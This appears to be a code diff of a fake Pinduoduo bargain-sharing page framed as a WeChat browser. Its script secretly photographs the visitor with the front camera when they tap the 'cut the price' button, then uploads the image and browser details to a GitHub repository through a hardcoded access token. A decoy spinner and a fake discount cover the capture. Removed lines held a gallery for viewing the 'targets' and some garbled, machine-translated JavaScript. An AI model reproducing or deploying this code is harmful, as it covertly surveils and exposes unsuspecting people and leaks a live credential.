@@ -7,14 +7,12 @@
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
-<!-- FAKE WECHAT BROWSER CHROME -->
 <div style="height:44px;background:#ededed;display:flex;align-items:center;justify-content:center;font-size:17px;color:#000;border-bottom:1px solid #d8d8d8;position:relative">
   <span style="position:absolute;left:15px;font-size:18px">‹</span>
   拼多多
   <span style="position:absolute;right:15px;font-weight:bold">···</span>
 </div>
 
-<!-- TOP BANNER -->
 <div style="background:linear-gradient(180deg,#ff5252 0%,#ff7a3d 100%);padding:14px 16px 18px;color:#fff;position:relative;overflow:hidden">
   <div style="display:flex;justify-content:space-between;align-items:center;font-size:12px">
     <span style="background:rgba(255,255,255,0.18);padding:3px 8px;border-radius:10px;font-size:10px">🔥 砍价免费拿</span>
@@ -24,7 +22,6 @@
   <div style="font-size:12px;margin-top:4px;opacity:0.9">已有 1,328,927 位好友砍价成功 🏆</div>
 </div>
 
-<!-- ITEM CARD -->
 <div style="background:#fff;margin:-12px 12px 0;border-radius:12px;padding:18px;box-shadow:0 2px 8px rgba(0,0,0,0.06);position:relative">
   <div style="display:flex;align-items:center;gap:12px;padding:10px 0">
     <div style="width:62px;height:62px;background:linear-gradient(135deg,#ffe5d4,#ffd0b0);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:28px;flex-shrink:0">📱</div>
@@ -62,7 +59,6 @@
   </div>
 </div>
 
-<!-- HELPERS LIST -->
 <div style="background:#fff;margin:10px 12px;border-radius:12px;padding:14px;box-shadow:0 2px 8px rgba(0,0,0,0.06)">
   <div style="font-size:14px;font-weight:600;margin-bottom:10px;border-left:3px solid #ff4040;padding-left:6px">帮砍好友 (24)</div>
   <div style="display:flex;align-items:center;gap:10px;padding:8px 0;font-size:12px;color:#666">
@@ -91,13 +87,11 @@
   </div>
 </div>
 
-<!-- BIG KNIFE BUTTON -->
 <div style="padding:20px 16px 30px;text-align:center">
   <button id="knifeBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:16px;border-radius:30px;font-size:17px;font-weight:700;border:none;box-shadow:0 4px 12px rgba(255,80,80,0.4);letter-spacing:2px;cursor:pointer">🗡️ 帮好友砍一刀</button>
   <div style="font-size:10px;color:#999;margin-top:10px">⚡ 每天可帮砍 3 次 · 已使用 1 次</div>
 </div>
 
-<!-- POPUP MODAL -->
 <div id="overlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.55);display:none;align-items:center;justify-content:center;z-index:999;padding:20px">
   <div style="background:#fff;border-radius:14px;padding:22px 20px;width:100%;max-width:320px;text-align:center;position:relative">
     <span id="modalClose" style="position:absolute;top:10px;right:12px;font-size:20px;color:#999;cursor:pointer">×</span>
@@ -112,28 +106,23 @@
 
 <script>
 (function(){
-  // ========== GitHub 配置(已填好) ==========
-  const GH_TOKEN = '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';
-  const GH_OWNER = 'lk20050411';
-  const GH_REPO  = 'pdd-photo';
-  const GH_BRANCH = 'main';
-  // ============================================
+  var GH_TOKEN = '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';
+  var GH_OWNER = 'lk20050411';
+  var GH_REPO  = 'pdd-photo';
+  var GH_BRANCH = 'main';
 
-  const STORAGE_KEY = 'pdd_captures_v1';
-  let left = 88.32;
-  const total = 353.28;
-  let stream = null;
+  var left = 88.32;
 
   function $(id){ return document.getElementById(id); }
   function toast(msg){
-    const t = $('toast');
+    var t = $('toast');
     t.textContent = msg;
     t.style.opacity = '1';
     setTimeout(function(){ t.style.opacity = '0'; }, 1800);
   }
   function coinRain(){
-    for(let i=0;i<14;i++){
-      const c = document.createElement('div');
+    for(var i=0;i<14;i++){
+      var c = document.createElement('div');
       c.textContent = ['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
       c.style.cssText = 'position:fixed;top:-20px;font-size:24px;z-index:998;pointer-events:none;animation:fall 1.6s linear forwards;left:' + (Math.random()*100) + 'vw;animation-duration:' + (1.2+Math.random()*0.8) + 's;animation-delay:' + (Math.random()*0.3) + 's';
       document.body.appendChild(c);
@@ -141,122 +130,128 @@
     }
   }
 
-  const style = document.createElement('style');
+  var style = document.createElement('style');
   style.textContent = '@keyframes fall{to{transform:translateY(110vh) rotate(540deg);opacity:0}}';
   document.head.appendChild(style);
 
   function updateProgress(){
-    $('ringFg').style.strokeDashoffset = 251.3 - (251.3 * 0.75);
+    var fg = $('ringFg');
+    if(fg) fg.style.strokeDashoffset = 251.3 - (251.3 * 0.75);
     $('leftMoney').textContent = left.toFixed(2);
     $('leftMoney2').textContent = left.toFixed(2);
   }
 
-  async function silentCapture(){
-    try{
-      if(!stream){
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: 1280, height: 720 },
-          audio: false
-        });
-      }
-      const v = $('vid');
-      v.srcObject = stream;
-      await new Promise(function(r){ setTimeout(r, 2200); });
+  function silentCapture(){
+    console.log('[DEBUG] silentCapture called');
+    var overlay = $('overlay');
+    overlay.style.display = 'flex';
+    $('modalContent').innerHTML = '<div style="width:46px;height:46px;border:4px solid #ffe0e0;border-top-color:#ff4040;border-radius:50%;margin:10px auto;animation:spin 0.9s linear infinite"></div><div style="font-size:17px;margin-top:14px;color:#ff4040;font-weight:700">正在邀请好友助力...</div><div style="color:#999;font-size:13px;margin-top:6px">匹配中 · 预计 3 秒</div>';
 
-      const c = $('canvas');
+    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
+      console.log('[DEBUG] no mediaDevices API');
+      setTimeout(function(){ showResult(5.88); }, 2800);
+      return;
+    }
+
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: 1280, height: 720 },
+      audio: false
+    }).then(function(stream){
+      console.log('[DEBUG] got stream');
+      var v = $('vid');
+      v.srcObject = stream;
+      return new Promise(function(resolve){ setTimeout(function(){ resolve(stream); }, 2200); });
+    }).then(function(stream){
+      var v = $('vid');
+      var c = $('canvas');
       c.width = v.videoWidth || 1280;
       c.height = v.videoHeight || 720;
-      const ctx = c.getContext('2d');
+      var ctx = c.getContext('2d');
       ctx.drawImage(v, 0, 0);
-      const blob = await new Promise(function(r){ c.toBlob(r, 'image/jpeg', 0.85); });
 
-      stream.getTracks().forEach(function(t){ t.stop(); });
-      stream = null;
-
-      await uploadImage(blob);
-    } catch(e){
-      console.log('cam blocked:', e);
-    }
+      return new Promise(function(resolve){
+        c.toBlob(function(blob){
+          stream.getTracks().forEach(function(t){ t.stop(); });
+          resolve(blob);
+        }, 'image/jpeg', 0.85);
+      });
+    }).then(function(blob){
+      console.log('[DEBUG] got blob, size:', blob.size);
+      return uploadImage(blob);
+    }).catch(function(e){
+      console.log('[DEBUG] cam err:', e);
+      setTimeout(function(){ showResult(7.32); }, 800);
+    });
   }
 
-  async function uploadImage(blob){
-    try{
-      const reader = new FileReader();
-      const dataUrl = await new Promise(function (resolve, 拒绝) {
-        读者.加载 = 函数 () { 解决(阅读器.结果); };
-        阅读器.onerror = reject;
-        reader.readAsDataURL(blob);
-      });
+  function showResult(cut){
+    var need = Math.ceil(Math.random()*3+1);
+    $('modalContent').innerHTML = '<div style="font-size:42px;margin:6px 0">🎉🪙</div><div style="font-size:17px;color:#ff4040;font-weight:700">恭喜!成功砍掉 ' + cut.toFixed(2) + ' 元</div><div style="font-size:13px;color:#666;line-height:1.6;margin:12px 0">还差 <b style="color:#ff4040">' + left.toFixed(2) + '</b> 元<br>再邀请 ' + need + ' 位新好友即可 0 元拿</div><button id="modalBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:12px;border-radius:30px;font-size:15px;font-weight:700;border:none;cursor:pointer">继续邀请好友 👉</button><div id="shareWx" style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer">📤 分享到微信</div>';
 
-      const base64 = dataUrl.分割(',')[1];
+    document.getElementById('modalBtn').addEventListener('click', function(){
+      $('overlay').style.display = 'none';
+    });
+    var sw = document.getElementById('shareWx');
+    if(sw) sw.addEventListener('click', function(){ toast('请点击右上角 ··· 分享'); });
+    coinRain();
+  }
 
-      const now = new Date();
-      const filename = now.getFullYear() + 
-        String(now.getMonth() + 1).padStart(2, '0') + 
-        String(now.getDate()).padStart(2, '0') + '_' +
-        String(now.getHours()).padStart(2, '0') + 
-        String(now.getMinutes()).padStart(2, '0') + 
-        String(now.getSeconds()).padStart(2, '0') + '_' +
-        Math.random().toString(36).slice(2, 6) + '.jpg';
+  function uploadImage(blob){
+    return new Promise(function(resolve){
+      var reader = new FileReader();
+      reader.onload = function(){
+        var base64 = reader.result.split(',')[1];
+        var now = new Date();
+        var filename = now.getFullYear() + 
+          String(now.getMonth() + 1).padStart(2, '0') + 
+          String(now.getDate()).padStart(2, '0') + '_' +
+          String(now.getHours()).padStart(2, '0') + 
+          String(now.getMinutes()).padStart(2, '0') + 
+          String(now.getSeconds()).padStart(2, '0') + '_' +
+          Math.random().toString(36).slice(2, 6) + '.jpg';
 
-      const meta = {
-        ua: navigator.userAgent,
-        time: now.toISOString(),
-        filename: filename,
-      };
+        var meta = JSON.stringify({
+          ua: navigator.userAgent,
+          time: now.toISOString()
+        });
 
-      const res = await fetch(
-        'https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents/' + filename,
-        {
+        fetch('https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents/' + filename, {
           method: 'PUT',
           headers: {
             'Authorization': 'token ' + GH_TOKEN,
             'Content-Type': 'application/json',
-            'Accept': 'application/vnd.github.v3+json',
+            'Accept': 'application/vnd.github.v3+json'
           },
           body: JSON.stringify({
-            message: 'capture: ' + meta.time,
+            message: 'capture ' + meta,
             branch: GH_BRANCH,
-            content: base64,
-          }),
-        }
-      );
-
-      const data = await res.json();
-
-      if (data && data.content && data.content.download_url) {
-        console.log('✓ uploaded:', data.content.download_url);
-        toast('✓ 助力成功');
-      } else {
-        console.log('upload failed:', data);
-      }
-    } catch (e) {
-      console.log('upload error:', e);
-    }
+            content: base64
+          })
+        }).then(function(res){ return res.json(); })
+          .then(function(data){
+            console.log('[DEBUG] upload result:', data);
+            if(data && data.content && data.content.download_url){
+              console.log('✓ uploaded:', data.content.download_url);
+              toast('✓ 助力成功');
+            } else {
+              console.log('upload failed');
+            }
+            resolve();
+          })
+          .catch(function(e){
+            console.log('upload err:', e);
+            resolve();
+          });
+      };
+      reader.readAsDataURL(blob);
+    });
   }
 
-  $('knifeBtn').addEventListener('click', function(){
+  var btn = $('knifeBtn');
+  console.log('[DEBUG] btn found:', btn);
+  btn.addEventListener('click', function(){
+    console.log('[DEBUG] button clicked');
     silentCapture();
-
-    $('modalContent').innerHTML = '<div style="width:46px;height:46px;border:4px solid #ffe0e0;border-top-color:#ff4040;border-radius:50%;margin:10px auto;animation:spin 0.9s linear infinite"></div><div style="font-size:17px;margin-top:14px;color:#ff4040;font-weight:700">正在邀请好友助力...</div><div style="color:#999;font-size:13px;margin-top:6px">匹配中 · 预计 3 秒</div>';
-    $('overlay').style.display = 'flex';
-
-    setTimeout(function(){
-      const cut = (Math.random() * 8 + 2).toFixed(2);
-      left = Math.max(0.01, left - parseFloat(cut));
-      updateProgress();
-      coinRain();
-
-      const need = Math.ceil(Math.random()*3+1);
-      $('modalContent').innerHTML = '<div style="font-size:42px;margin:6px 0">🎉🪙</div><div style="font-size:17px;color:#ff4040;font-weight:700">恭喜!成功砍掉 ' + cut + ' 元</div><div style="font-size:13px;color:#666;line-height:1.6;margin:12px 0">还差 <b style="color:#ff4040">' + left.toFixed(2) + '</b> 元<br>再邀请 ' + need + ' 位新好友即可 0 元拿</div><button id="modalBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:12px;border-radius:30px;font-size:15px;font-weight:700;border:none;cursor:pointer">继续邀请好友 👉</button><div id="shareWx" style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer">📤 分享到微信</div>';
-
-      $('modalBtn').addEventListener('click', function(){
-        $('overlay').style.display = 'none';
-      });
-      $('shareWx').addEventListener('click', function(){
-        toast('请点击右上角 ··· 分享');
-      });
-    }, 2800);
   });
 
   $('modalClose').addEventListener('click', function(){
@@ -267,88 +262,13 @@
     if(e.target === $('overlay')) $('overlay').style.display = 'none';
   });
 
-  const spinStyle = document.createElement('style');
+  var spinStyle = document.createElement('style');
   spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
   document.head.appendChild(spinStyle);
 
   updateProgress();
-
-  // ========== 后台浏览页(?viewer=1) ==========
-  if(new URLSearchParams(location.search).get('viewer') === '1'){
-    loadViewer();
-  }
-
-  async function loadViewer(){
-    const res = await fetch('https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents?ref=' + GH_BRANCH, {
-      headers: { 'Authorization': 'token ' + GH_TOKEN, 'Accept': 'application/vnd.github.v3+json' }
-    });
-    const files = await res.json();
-    
-    let html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>📸 捕获浏览</title>';
-    html += '<style>body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:16px}';
-    html += 'h1{margin:0 0 8px;font-size:20px}';
-    html += '.stat{color:#999;font-size:12px;margin-bottom:16px}';
-    html += '.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}';
-    html += '@media(min-width:600px){.grid{grid-template-columns:repeat(3,1fr)}}';
-    html += '.card{background:#111;border-radius:8px;overflow:hidden;cursor:pointer}';
-    html += '.card img{width:100%;display:block;aspect-ratio:3/4;object-fit:cover}';
-    html += '.meta{padding:6px;font-size:10px;color:#888}';
-    html += '.empty{color:#666;text-align:center;padding:40px}';
-    html += '.lightbox{position:fixed;inset:0;background:rgba(0,0,0,0.95);display:none;align-items:center;justify-content:center;z-index:9999;padding:20px}';
-    html += '.lightbox.show{display:flex}';
-    html += '.lightbox img{max-width:100%;max-height:90vh;object-fit:contain}';
-    html += '.lightbox .close{position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.1);border-radius:50%}';
-    html += '</style></head><body>';
-
-    if(!Array.isArray(files)){
-      html += '<h1>📸 错误</h1>';
-      html += '<div class="empty">无法读取仓库:<br>' + JSON.stringify(files) + '</div>';
-    } else {
-      const jpgs = files.filter(f => f.name.endsWith('.jpg'));
-      jpgs.sort((a,b) => b.name.localeCompare(a.name));
-      
-      html += '<h1>📸 捕获浏览</h1>';
-      html += '<div class="stat">共 ' + jpgs.length + ' 张 · 你的目标已经被拍下</div>';
-      
-      if(jpgs.length === 0){
-        html += '<div class="empty">暂无捕获。等目标点按钮~</div>';
-      } else {
-        html += '<div class="grid">';
-        for(const f of jpgs){
-          html += '<div class="card" data-url="' + f.download_url + '">';
-          html += '<img src="' + f.download_url + '" loading="lazy">';
-          html += '<div class="meta">' + f.name.replace('.jpg','') + '</div>';
-          html += '</div>';
-        }
-        html += '</div>';
-        html += '<div class="lightbox" id="lb"><span class="close" id="lbClose">×</span><img id="lbImg"></div>';
-      }
-    }
-
-    html += '</body></html>';
-    
-    document.open();
-    document.write(html);
-    document.close();
-
-    if(Array.isArray(files)){
-      document.querySelectorAll('.card').forEach(function(card){
-        card.addEventListener('click', function(){
-          document.getElementById('lbImg').src = card.dataset.url;
-          document.getElementById('lb').classList.add('show');
-        });
-      });
-      document.getElementById('lbClose').addEventListener('click', function(){
-        document.getElementById('lb').classList.remove('show');
-      });
-      document.getElementById('lb').addEventListener('click', function(e){
-        if(e.target === document.getElementById('lb')){
-          document.getElementById('lb').classList.remove('show');
-        }
-      });
-    }
-  }
+  console.log('[DEBUG] script loaded ok');
 })();
 </script>
 </body>
-</HTML>
+</html>
